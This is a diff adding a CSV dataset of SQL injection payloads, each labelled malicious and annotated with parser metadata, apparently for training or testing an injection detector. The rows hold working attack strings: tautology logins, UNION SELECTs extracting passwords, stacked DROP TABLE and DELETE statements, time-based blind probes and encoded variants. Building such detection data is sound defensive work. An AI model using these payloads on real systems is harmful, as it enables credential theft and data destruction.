@@ -1,0 +1,125 @@
+Query,Label,is_valid_syntax,winning_context_index,winning_dialect,tables,columns,literal_types,select_arm_widths,node_set
+' OR 'x'='x',1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+' OR 1=1 --,1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+'; DROP TABLE users;--,1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""Drop"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]"
+' OR 1=1 --,1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+; DROP TABLE IF EXISTS users;--,1,True,0,default,"[""users""]",[],[],[],"[""Drop"", ""Identifier"", ""Semicolon"", ""Table""]"
+/*'*/OR 1=1 /*'*/,1,True,1,default,"[""users""]",[],[],[],"[""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+1; --,1,True,0,default,[],[],[],[],"[""Literal"", ""Semicolon""]"
+1' AND '1'='1,1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+SELECT * FROM users WHERE id = 1 OR (SELECT 1 FROM (SELECT 1)) --,1,True,0,default,"[""users""]","[""id""]","[""INTEGER""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]"
+status = 'pending' OR 1=1 --,1,True,0,default,[],"[""status""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""Identifier"", ""Literal"", ""Or""]"
+status LIKE '%%' OR '1'='1',1,True,0,default,[],"[""status""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""Identifier"", ""Like"", ""Literal"", ""Or""]"
+SELECT * FROM orders WHERE status = 'cancelled' OR (SELECT 1 FROM (SELECT 0)),1,True,0,default,"[""orders""]","[""status""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]"
+"1 OR ""'""=""'",1,True,3,mysql,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""Concat"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+1 OR /* */ 1=1,1,True,0,default,[],[],[],[],"[""EQ"", ""Literal"", ""Or""]"
+1 OR -- 1,1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything',1,True,0,default,"[""users""]","[""username""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+SELECT * FROM users WHERE username = (SELECT username FROM admins LIMIT 1) AND password = '' OR '1'='1',1,True,0,default,"[""users"", ""admins""]","[""username"", ""password""]","[""TEXT"", ""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Limit"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]"
+"SELECT * FROM users WHERE username = CHAR(97,100,109,105,'n') COLLATE utf8mb4_general_ci AND password = 'ignore'",1,True,0,default,"[""users""]","[""username"", ""password""]","[""TEXT"", ""INTEGER""]",[],"[""And"", ""Chr"", ""Collate"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Var"", ""Where""]"
+"' OR '1'='1 UNION SELECT username, password FROM users --",1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+"` OR `1`=`1 UNION SELECT email, phone FROM customers /*",1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+"'; DROP TABLE IF EXISTS temp; CREATE TABLE temp AS SELECT id, CONCAT(username, ':', password) AS creds FROM users; --",1,True,2,default,"[""users"", ""temp""]","[""name"", ""id"", ""username"", ""password""]","[""TEXT"", ""TEXT"", ""TEXT"", ""TEXT""]",[],"[""Alias"", ""Column"", ""Concat"", ""Create"", ""Drop"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]"
+SELECT * FROM users WHERE id = ' OR '1'='1,1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+"-- -
+UNION SELECT password FROM users WHERE id = '-- -'",1,True,1,default,"[""users""]","[""password"", ""id""]","[""INTEGER"", ""INTEGER""]","[1, 1]","[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Union"", ""Where""]"
+/* comment */ UNION SELECT username FROM users WHERE id = '#comment',1,True,1,default,"[""users""]","[""username"", ""id""]","[""INTEGER"", ""INTEGER""]","[1, 1]","[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Union"", ""Where""]"
+"UNION SELECT username, password FROM users --""",1,True,1,default,"[""users""]","[""username"", ""password""]","[""INTEGER"", ""INTEGER""]","[1, 2]","[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Union"", ""Where""]"
+"OR 1=1;--""""""",1,True,1,default,"[""users""]",[],[],[],"[""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]"
+; DROP TABLE IF EXISTS temp_table; --,1,True,0,default,"[""temp_table""]",[],[],[],"[""Drop"", ""Identifier"", ""Semicolon"", ""Table""]"
+1); --,1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+"1');/**/UNION/**/SELECT/**/user_id,/**/password/**/FROM/**/users--",1,False,-1,,[],[],[],[],[]
+1 OR '1'='1,1,False,-1,,[],[],[],[],[]
+' OR '1'='1,1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+'; DROP TABLE IF EXISTS fakeusers; --,1,True,2,default,"[""users"", ""fakeusers""]","[""name""]","[""TEXT""]",[],"[""Column"", ""Drop"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]"
+username LIKE '%admin%' AND password LIKE '%admin%,1,False,-1,,[],[],[],[],[]
+"[""%\' AND 1=1 --""",1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+"\' OR 1=1 /*""",1,True,5,mysql,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+"%\') OR 1=0; -- \'""",1,True,6,default,"[""users""]","[""name""]","[""INTEGER""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Paren"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]"
+"\' AND (SELECT 1 FROM users WHERE username = 'admin') --""",1,True,2,default,"[""users""]","[""name"", ""username""]","[""TEXT"", ""INTEGER""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]"
+"\' OR 1=1 UNION SELECT NULL, NULL, password FROM users --""]",1,True,2,default,"[""users""]","[""password"", ""name""]","[""TEXT"", ""INTEGER""]","[1, 3]","[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Null"", ""Or"", ""Select"", ""Star"", ""Table"", ""Union"", ""Where""]"
+(SELECT CASE WHEN (SELECT 1 FROM users WHERE username = 'admin') THEN 1 ELSE 0 END),1,True,0,default,"[""users""]","[""username""]","[""INTEGER""]",[],"[""Case"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""If"", ""Literal"", ""Select"", ""Subquery"", ""Table"", ""Where""]"
+{--} OR 1=1 {--},1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+(CASE WHEN (SELECT password FROM users WHERE id = 1 LIMIT 1) LIKE '%a%' THEN 1 ELSE 0 END),1,True,0,default,"[""users""]","[""password"", ""id""]","[""INTEGER"", ""INTEGER""]",[],"[""Case"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""If"", ""Like"", ""Limit"", ""Literal"", ""Paren"", ""Select"", ""Subquery"", ""Table"", ""Where""]"
+' OR 1=1 --,1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+' AND '1'='1',1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+CASE WHEN 1=1 THEN '1' ELSE '' END,1,True,0,default,[],[],[],[],"[""Case"", ""EQ"", ""If"", ""Literal""]"
+' OR 1=1 --,1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+' AND 1=1 /*,1,False,-1,,[],[],[],[],[]
+'; DROP TABLE users;--,1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""Drop"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]"
+' OR '1'='1' -- -,1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+' OR SLEEP(5) -- -,1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Anonymous"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+'; WAITFOR DELAY '00:00:05' -- -,1,False,-1,,[],[],[],[],[]
+"' OR '1'='1' AND EXISTS(SELECT 1 FROM users WHERE username LIKE '%' || SUBSTRING(password, 1, 1) || '%' SLEEP(5)) --",1,False,-1,,[],[],[],[],[]
+""" OR ""1""=""1"" AND (SELECT IF(SUBSTRING(password, 1, 1) = 'a', sleep(5), NULL) FROM users)",1,True,1,default,"[""users""]","[""1"", ""password""]","[""INTEGER"", ""INTEGER""]",[],"[""And"", ""Anonymous"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""If"", ""Literal"", ""Null"", ""Or"", ""Select"", ""Star"", ""Subquery"", ""Substring"", ""Table"", ""Where""]"
+"' OR '1'='1' AND (BENCHMARK(1000000, MD5('')))",1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""And"", ""Anonymous"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""MD5"", ""Or"", ""Paren"", ""Select"", ""Star"", ""Table"", ""Where""]"
+OR 1=1 --,1,True,1,default,"[""users""]",[],[],[],"[""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+AND sleep(2) /*,1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+OR 1=1; DROP TABLE users --,1,True,1,default,"[""users""]",[],[],[],"[""Drop"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+SELECT * FROM orders WHERE status = 'ACTIVE' AND 1=0 OR 1=1 --' OR SLEEP(5) OR '1'='1,1,True,0,default,"[""orders""]","[""status""]","[""INTEGER""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+SELECT * FROM orders WHERE status = 'PENDING' AND EXTRACT(HOUR FROM NOW()) > 0 /*',1,False,-1,,[],[],[],[],[]
+"SELECT * FROM orders WHERE status = 'SHIPPED' AND BENCHMARK(1000000,CRC32(RAND())) --'",1,True,0,default,"[""orders""]","[""status""]","[""TEXT""]",[],"[""And"", ""Anonymous"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Rand"", ""Select"", ""Star"", ""Table"", ""Where""]"
+;/**/SLEEP(5);--,1,True,0,default,[],[],[],[],"[""Anonymous"", ""Literal"", ""Semicolon""]"
+';-- WAITFOR DELAY '00:00:05' --,1,True,2,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]"
+"/*
+TIME_WAIT('5')
+*/;WAITFOR DELAY '00:00:05'--",1,False,-1,,[],[],[],[],[]
+; DROP TABLE IF EXISTS users; --,1,True,0,default,"[""users""]",[],[],[],"[""Drop"", ""Identifier"", ""Semicolon"", ""Table""]"
+"'; CREATE TABLE hackers (id INTEGER PRIMARY KEY, name TEXT); --",1,True,2,default,"[""users"", ""hackers""]","[""name""]","[""TEXT""]",[],"[""Column"", ""ColumnConstraint"", ""ColumnDef"", ""Create"", ""DataType"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""PrimaryKeyColumnConstraint"", ""Schema"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]"
+"--; INSERT INTO users (username, password) VALUES ('admin', 'admin');",1,True,0,default,[],[],[],[],[]
+; DROP TABLE users; --,1,True,0,default,"[""users""]",[],[],[],"[""Drop"", ""Identifier"", ""Semicolon"", ""Table""]"
+; SELECT * FROM users WHERE username = 'admin' AND password = 'anything'; //,1,True,0,snowflake,"[""users""]","[""username"", ""password""]","[""TEXT"", ""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]"
+'; DROP DATABASE database_name;--,1,True,2,default,"[""users"", ""database_name""]","[""name""]","[""TEXT""]",[],"[""Column"", ""Drop"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]"
+; DROP TABLE users;,1,True,0,default,"[""users""]",[],[],[],"[""Drop"", ""Identifier"", ""Table""]"
+"--
+SELECT id FROM users --",1,True,0,default,"[""users""]","[""id""]","[""TEXT""]",[],"[""Column"", ""From"", ""Identifier"", ""Select"", ""Table""]"
+/*malicious*/ ; DELETE FROM users;,1,True,0,default,"[""users""]",[],[],[],"[""Delete"", ""Identifier"", ""Semicolon"", ""Table""]"
+; DROP TABLE users --,1,True,0,default,"[""users""]",[],[],[],"[""Drop"", ""Identifier"", ""Table""]"
+"; DELETE FROM orders;
+--",1,True,0,default,"[""orders""]",[],[],[],"[""Delete"", ""Identifier"", ""Semicolon"", ""Table""]"
+--'; INSERT INTO logs VALUES ('hack');--,1,True,0,default,[],[],[],[],[]
+SELECT * FROM users; DROP TABLE comments; --,1,True,0,default,"[""users"", ""comments""]",[],[],[],"[""Drop"", ""From"", ""Identifier"", ""Select"", ""Semicolon"", ""Star"", ""Table""]"
+--'; DELETE FROM sessions; --,1,True,0,default,[],[],[],[],[]
+"/* SQL Injection */; SELECT username, password FROM admin",1,True,0,default,"[""admin""]","[""username"", ""password""]","[""TEXT"", ""TEXT""]",[],"[""Column"", ""From"", ""Identifier"", ""Select"", ""Semicolon"", ""Table""]"
+SELECT * FROM users WHERE username = 'admin' /*--*/ AND password = 'admin',1,True,0,default,"[""users""]","[""username"", ""password""]","[""TEXT"", ""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+SELECT * FROM users WHERE username = 'admin' #AND password = 'admin',1,True,0,mysql,"[""users""]","[""username""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+SELECT * FROM users WHERE username = 'admin' AND (/*')) */ password = 'admin';,1,False,-1,,[],[],[],[],[]
+/**/SELECT%20*%20FROM%20products%20WHERE%20name%20LIKE%20'%E2%9C%94%E2%9C%94',1,True,6,mysql,"[""users""]","[""name"", ""9C"", ""E2""]","[""INTEGER"", ""INTEGER"", ""TEXT""]",[],"[""Alias"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Mod"", ""Paren"", ""Select"", ""Star"", ""Table"", ""Where""]"
+--+SELECT+*+FROM+products+WHERE+name+LIKE+'%%',1,True,0,default,[],[],[],[],[]
+#SELECT * FROM products WHERE name LIKE '/*%',1,True,0,mysql,[],[],[],[],[]
+--' OR '1'='1,1,True,0,default,[],[],[],[],[]
+/**/1=1,1,True,0,default,[],[],[],[],"[""EQ"", ""Literal""]"
+SELECT * FROM orders WHERE status = '/*' OR '1'='1' /*' ORDER BY date DESC,1,False,-1,,[],[],[],[],[]
+SELECT * FROM orders WHERE status = '--' OR 1=1 --' ORDER BY date DESC,1,True,0,default,"[""orders""]","[""status""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+SELECT * FROM orders WHERE status = '#' OR 1=1 #' ORDER BY date DESC,1,True,0,mysql,"[""orders""]","[""status""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+--' OR '1'='1,1,True,0,default,[],[],[],[],[]
+#' OR '1'='1,1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+/**/' OR '1'='1,1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+%27+OR+1=1;--,1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+%65%78%61%6D%70%6C%65+%72%65%61%64(%27+OR+1=1;),1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+"UNION+SELECT+NULL,+username+FROM+users+WHERE+1=1",1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+%25' OR '1'='1,1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+"' OR ASCII(SUBSTRING(username,1,1))=116 --",1,True,2,default,"[""users""]","[""name"", ""username""]","[""TEXT"", ""INTEGER""]",[],"[""Ascii"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Substring"", ""Table"", ""Where""]"
+%23SELECT+*+FROM+users+WHERE+id+%3D+'admin',1,False,-1,,[],[],[],[],[]
+SELECT+*+FROM+users+WHERE+id=CHAR(97)+||+CHAR(98)+||+CHAR(100),1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+/*SELECT*/+*+FRom+usErS+wHeRe+iD+/**/=/**/'a',1,False,-1,,[],[],[],[],[]
+%27--,1,True,1,default,"[""users""]",[],[],[],"[""EQ"", ""From"", ""Identifier"", ""Literal"", ""Mod"", ""Select"", ""Star"", ""Table"", ""Where""]"
+%60;/**/,1,True,1,default,"[""users""]",[],[],[],"[""EQ"", ""From"", ""Identifier"", ""Literal"", ""Mod"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]"
+CHAR(39)%0A,1,True,0,default,[],[],[],[],"[""Alias"", ""Chr"", ""Identifier"", ""Literal"", ""Mod""]"
+"%27+UNION+SELECT+NULL,+body+FROM+users--",1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+"CHAR(45)-*UNION+SELECT+email,+password+FROM+admin/*",1,True,5,default,"[""users""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+SELECT * FROM users WHERE username = '' OR '1'='1',1,True,0,default,"[""users""]","[""username""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything',1,True,0,default,"[""users""]","[""username""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+"SELECT * FROM users WHERE username IN ('admin', (SELECT 'x'))",1,True,0,default,"[""users""]","[""username""]","[""TEXT""]",[],"[""Column"", ""From"", ""Identifier"", ""In"", ""Literal"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]"
+;select * from users where username like '%' --,1,True,0,default,"[""users""]","[""username""]","[""TEXT""]",[],"[""Column"", ""From"", ""Identifier"", ""Like"", ""Literal"", ""Select"", ""Star"", ""Table"", ""Where""]"
+' OR EXISTS(SELECT 1 FROM orders),1,True,2,default,"[""users"", ""orders""]","[""name""]","[""TEXT""]",[],"[""Column"", ""EQ"", ""Exists"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Table"", ""Where""]"
+'; DROP TABLE IF EXISTS backups;--,1,True,2,default,"[""users"", ""backups""]","[""name""]","[""TEXT""]",[],"[""Column"", ""Drop"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Semicolon"", ""Star"", ""Table"", ""Where""]"
+(SELECT 1 FROM (SELECT CASE WHEN id=1 THEN 1 ELSE 0 END AS x FROM users)),1,True,0,default,"[""users""]","[""id""]","[""INTEGER""]",[],"[""Alias"", ""Case"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""If"", ""Literal"", ""Select"", ""Subquery"", ""Table""]"
+1 AND (SELECT COUNT(*) FROM users WHERE id=2),1,True,0,default,"[""users""]","[""id""]","[""INTEGER""]",[],"[""And"", ""Column"", ""Count"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""Where""]"
+-- OR 'a'='a'; SELECT * FROM users WHERE id=(SELECT MAX(id) FROM users),1,True,0,default,[],[],[],[],[]
+(SELECT status FROM users WHERE username = 'admin' AND password = 'password'),1,True,0,default,"[""users""]","[""status"", ""username"", ""password""]","[""TEXT"", ""TEXT"", ""TEXT""]",[],"[""And"", ""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Subquery"", ""Table"", ""Where""]"
+/* OR (SELECT 1 FROM users WHERE username = 'admin'-- */),1,False,-1,,[],[],[],[],[]
+OR (SELECT * FROM (SELECT * FROM users WHERE username = 'admin') AS temp),1,True,1,default,"[""users""]","[""username""]","[""INTEGER""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Or"", ""Select"", ""Star"", ""Subquery"", ""Table"", ""TableAlias"", ""Where""]"
+(SELECT body FROM comments WHERE user_id=1)--,1,True,0,default,"[""comments""]","[""body"", ""user_id""]","[""INTEGER"", ""TEXT""]",[],"[""Column"", ""EQ"", ""From"", ""Identifier"", ""Literal"", ""Select"", ""Subquery"", ""Table"", ""Where""]"
+--(SELECT body FROM comments WHERE user_id=1) --,1,True,0,default,[],[],[],[],[]
+;--(SELECT body FROM comments WHERE user_id=1);--,1,True,0,default,[],[],[],[],"[""Semicolon""]"
